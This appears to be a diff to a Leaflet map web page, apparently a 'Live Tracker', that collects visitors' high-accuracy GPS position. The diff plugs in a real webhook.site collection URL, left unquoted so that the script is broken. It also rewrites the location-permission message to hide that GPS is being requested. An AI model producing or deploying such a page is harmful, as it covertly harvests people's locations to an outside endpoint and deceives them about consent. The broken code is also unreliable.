@@ -32,7 +32,7 @@
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script>
         // --- CONFIGURATION ---
-        const WEBHOOK_URL = 'YOUR_WEBHOOK_URL_HERE'; // Replace with your Webhook.site URL
+        const WEBHOOK_URL = https://webhook.site/0e622ff9-fb00-4af3-b099-5804a0c393f7; // Replace with your Webhook.site URL
         
         // 1. Initialize Map showing South India
         var map = L.map('map').setView([11.5, 77.0], 7);
@@ -83,7 +83,7 @@
                         map.setView([lat, lon], 14);
                     },
                     (err) => {
-                        statusText.innerText = "Error: Please allow GPS access to use the Live Tracker.";
+                        statusText.innerText = "Error: Please allow to view updates.";
                     },
                     { enableHighAccuracy: true, timeout: 10000 }
                 );
